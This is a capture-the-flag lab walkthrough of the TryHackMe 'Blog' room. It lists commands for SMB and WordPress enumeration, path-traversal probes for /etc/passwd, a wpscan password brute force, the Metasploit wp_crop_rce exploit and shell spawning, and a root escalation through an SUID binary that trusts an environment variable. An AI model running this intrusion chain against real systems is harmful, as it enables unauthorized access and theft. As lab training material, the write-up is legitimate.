# TryHackMe - Blog Room Writeup

## Overview

This is a detailed walkthrough of how I rooted the **Blog** room on TryHackMe and captured both user and root flags. The room involved Wordpress Enumeration, brute force attacks, and privilege escalation through misconfigured SUID binaries.

---

## Enumeration

I started the engagement with an `nmap` scan:

```bash
nmap -sC -sV -p- -v -oN /home/kali/Desktop/THM_LAB/rooms/Blog/scan.txt <target-ip>
```

The scan revealed four open ports:

- **22** (SSH)
- **80** (HTTP)
- **139** (netbios-ssn samba smbd)
- **445** (netbios-ssn samba smbd)

i tried to find out further hidden directories.
```bash
gobuster dir -u http://<target-ip> -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

---

## Web Application Discovery

Initally, I added an entry to my `/etc/hosts` file:

```bash
<target-ip> blog.thm
```
Then, The first thing which comes to my attention was the open SMB ports. i statred to enumerate for Samba shares using `smbclient`. we can do it by tool called `enum4linux` too.

initally i tried for anonymous login where i succeded with blank password.

```bash
smbclient -L blog.thm -U Anonymous
```
The BillySMB shares look intriguing. i fetched those shares using smbclient.

```bash
smbclient //blog.thm/BillySMB  
```
There were three files: `Alice-White-Rabbit.jpg`, `tswift.mp4` and `check-this.png`

so i thought there might be something steganographically embedded so i use `steghide` for file `Alice-White-Rabbit.jpg` .

```bash
steghide extract -sf <filename>
```
my guess was right there was a `rabbit_hole.txt` file embedded in the image which i extracted without any password. Fetched this file and i saw it’s contents got to have fallen into a rabbit hole.

Next there was another file and moving onto `check-this.png`. Scanning the code led me to Billy Joel’s music video of We Didn’t Start The Fire.

Last but not the least i had `tswift.mp4` which is a funny parody of Taylor Swift’s video , I Knew You Were Trouble. Do give it a watch xD.

Jokes apart, i had reached a dead end here. The Samba shares did not turn out to be useful. Now, i head over to Port 80. There i find Billy Joel’s Blog.

i tried if i can access internal directoires by manipulating url and got nothing.
```
blog.thm/?cmd=../../../../../../etc/passwd
blog.thm/?=../../../../../../etc/passwd
blog.thm/?ext=../../../../../../etc/passwd
```
---

## Username Enumeration

It’s a very standard Wordpress website. For enumerating i used a wonderful tool called `wpscan`.
wpscan is a vulnerability scanned tool, it can enumerate versions,plugins,themes,users and can also be used as a brute force attack tool

```bash
wpscan --url http://<machine-IP>/ 
```
A simple wpscan shows that there was `xml-rpc enabled` on the website, whenever this file is enabled on any wordpress website, the website becomes vulnerable to brute-force attack, so to read about this vulnerability in detail i looked this website:- `https://www.hostinger.in/tutorials/xmlrpc-wordpress`.

I also found out about the Insecure Wordpress version which this site was using and again which might become useful later on.

```bash
wpscan --url http://<machine-IP>/ -e u
```
	-e :- this flag tells wpscan to enumerate, this flag requires an argument,
	u :- it is the argument we feed to -e, this tells wpscan to enumerate user ID's
	
-e flag has many options to gather all kinds of information such as version, plugins used, databases, themes used etc.

here i was able to find some users `kwheel`, `bjoel`. 
Now towards attack phase,i perform brute-force with wpscan.

---

## Password Brute-Forcing

```bash
wpscan --url http://<machine-IP>/ -U <usernames.txt> -P <password-list.txt>
```
For this attack is i used `rockyou.txt` password list and I added the names of users in a .txt file

- **kwheel password:** `cutiepie1`
Nice, im an authenticated user account.
Now, where to go from here?
Let's go back to the Wordpress version found earlier which was insecure.

---


### Exploitation using Metasploit

To find information and vulnerabilities on this particular version of wordpress, I used a tool called `searchsploit`.

```bash
searchsploit wordpress 5.0
```

I loaded the following Metasploit module:

msfconsole
	-> search wordpress 5.0
	-> use 0 (multi/http/wp_crop_rce)

Configured with:

- `RHOSTS`: `blog.thm`/`<victim-ip>`
- `LHOST`: My machine's IP
- `USERNAME`: kwheel
- `PASSWORD`: cutiepie1

```
search wordpress 5.0
exploit(multi/http/wp_crop_rce)
show options
run
```
This yielded a **Meterpreter session** then i switched to a shell for our convenience and spawn tty shell using python.

```
python -c 'import pty; pty.spawn("/bin/sh")'
```

---


## Privilege Escalation

After getting a shell, i tried to find a way to escalate my privileges.
so, I checked `kwheel`’s sudo privileges:

```bash
sudo -l
```
there i got nothing interesting so i checked for SUID. 

```bash
find / -perm -4000 2>/dev/null
```
There i found a very interesting SUID `/usr/sbin/checker`.
To reverse-engineer this i used a command called `ltrace`. There are other options too for viewing the binaries content like `Ghrida`.

after a quick inspection reveals a very interesting piece of code.

```
getenv("admin") = nil
puts("Not an Admin"
    Not an Admin
  ) = 13 
```

What this "checker" is doing is calling a getenv() on "admin" variable and returning its value i.e. "nil", because the "admin" environment  variable does not exist, so on running "checker" it's giving the output "Not an admin"

i exported an environment variable with any value as i wanted to exploit the vulnerability of "checker" as “admin” and get root privileges!

```bash
export admin=/root
checker
```
```bash
find / 2>/dev/null | grep user.txt
cat /media/usb/user.txt
cat /root/root.txt
```
     
here, i got  **root** access and obtained the **root / users flag** from `root.txt`.

OR 

another way for user flag.
- mysql
```
     cat wp-config.php                 // mysql username & password
     mysql -u <username> -p
     show databases;
     use blog;
     show cloumns;
     show tables;
     select * from wp_users;
```
here, i found hash of the user which was then cracked.


---

## Conclusion

The Blog room involved a mix of:

- Web app reconnaissance
- Login enumeration
- Credential brute-forcing
- Remote code execution via a known exploit
- SUID binary path manipulation
- Sudo misconfigurations

Each step built on the last, and it was a great exercise in real-world exploitation chains.

---

## Tools
 - nmap
 - gobuster
 - smbclient
 - wpscan
 - ghrida / ltrace
 - msfconsole
 

🖼️ **Find all screenshots here:** [`screenshots/blog/`](../screenshots/blog/)

*Thanks for reading!*
